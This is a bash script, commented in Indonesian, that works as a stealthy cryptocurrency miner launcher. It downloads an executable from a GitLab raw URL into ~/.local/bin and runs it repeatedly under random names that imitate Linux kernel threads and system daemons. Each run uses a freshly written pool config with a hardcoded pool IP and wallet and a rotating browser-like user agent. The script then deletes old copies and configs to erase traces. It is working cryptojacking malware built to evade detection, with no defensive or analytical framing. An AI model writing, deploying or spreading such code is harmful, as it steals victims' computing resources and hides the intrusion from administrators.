#!/usr/bin/env bash

BIN_URL="https://gitlab.com/notesss2/filess/-/raw/main/sumo"
BIN_NAME_ORI="sys-helper"
LOCAL_BIN_DIR="$HOME/.local/bin"

RUNTIME=240  # 4 menit

MIN_SLEEP=30
MAX_SLEEP=40

POOL="178.128.240.168:443"
WALLET="v2df0zlb7dqvmbpr3uq7jbeaucbijily6cgcpl0ckswlh"

THREAD_LIST=(6 7 8)

UA_LIST=(
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0"
    "Spotify/8.8.44 (Windows NT 10.0; Win64; x64)"
    "iTunes/12.10.9 (Windows; Microsoft Windows 10 x64 Business Edition (Build 19041); x64) AppleWebKit/7607.3.18.0.2"
)

# Daftar nama proses Linux core yang lebih beragam
POSSIBLE_NAMES=(".dbus-daemon" "migration" "watchdog" ".ksoftirqd" "rcu_sched" ".profile-cache" 
                "rcu_bh" "kdevtmpfs" "kintegrityd" "kblockd" "kthrotld")

# Fungsi untuk generate string acak menggunakan bash RANDOM
generate_random_string() {
    local length=${1:-8}
    local chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    local result=''
    for ((i=0; i<length; i++)); do
        result+=${chars:RANDOM%${#chars}:1}
    done
    echo "$result"
}

mkdir -p "$LOCAL_BIN_DIR"
cd "$LOCAL_BIN_DIR" || exit

if [ ! -f "$BIN_NAME_ORI" ]; then
    curl -sL "$BIN_URL" -o "$BIN_NAME_ORI"
    chmod +x "$BIN_NAME_ORI"
fi

while true; do
    # Hapus semua file sesi lama berdasarkan POSSIBLE_NAMES
    for name in "${POSSIBLE_NAMES[@]}"; do
        # Hapus titik jika ada untuk pattern matching
        clean_name="${name#.}"
        rm -f "$LOCAL_BIN_DIR"/"$name"*
        rm -f "$LOCAL_BIN_DIR"/"$clean_name"*
    done
    # Hapus juga file config
    rm -f "$LOCAL_BIN_DIR"/*.json
    rm -f "$LOCAL_BIN_DIR"/*.conf

    THREADS=${THREAD_LIST[$RANDOM % ${#THREAD_LIST[@]}]}
    
    PAUSE=$((RANDOM % (MAX_SLEEP - MIN_SLEEP + 1) + MIN_SLEEP))

    UA=${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}
    
    # Pilih nama binary acak dari daftar
    BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
    
    # Tambahkan string acak untuk membuat nama lebih unik
    RAND_SUFFIX=$(generate_random_string 12)
    BIN_NAME_FULL="${BIN_NAME}${RAND_SUFFIX}"
    
    # Buat nama config dengan suffix acak
    CONFIG_SUFFIX=$(generate_random_string 10)
    CONFIG_NAME="${BIN_NAME}_config${CONFIG_SUFFIX}.json"

    cp "$BIN_NAME_ORI" "$BIN_NAME_FULL"
    chmod +x "$BIN_NAME_FULL"

    cat > "$CONFIG_NAME" << EOF
{
  "api": {
    "worker-id": "$WORKER"
  },
  "autosave": true,
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "system",
      "keepalive": true,
      "tls": true
    }
  ],
  "user-agent": "$UA",
  "threads": $THREADS
}
EOF

    nohup nice -n 15 timeout "$RUNTIME" ./"$BIN_NAME_FULL" -c "$CONFIG_NAME" >/dev/null 2>&1 &
    sleep "$RUNTIME"

    sleep "$PAUSE"
done
